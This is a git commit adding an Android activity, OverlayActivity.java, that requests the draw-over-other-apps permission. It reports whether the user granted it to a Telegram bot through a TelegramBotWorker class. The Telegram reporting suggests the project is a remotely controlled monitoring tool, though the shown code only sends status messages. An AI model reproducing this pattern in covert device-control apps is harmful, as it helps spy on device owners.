77236260c436090649b37a756af15e1a5eb26316
Jasim9085 <juahmed9085@gmail.com>
2025-08-16 13:19:18 +0530

    update app/src/main/java/com/chimera/OverlayActivity.java

---
+++ app/src/main/java/com/chimera/OverlayActivity.java
@@ -0,0 +1,37 @@
+package com.chimera;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Settings;
+
+public class OverlayActivity extends Activity {
+    private static final int OVERLAY_PERMISSION_REQ_CODE = 1234;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
+        } else {
+            finish();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+                TelegramBotWorker.sendMessage("Overlay permission granted.", this);
+            } else {
+                TelegramBotWorker.sendMessage("Overlay permission was denied.", this);
+            }
+        }
+        finish();
+    }
+}
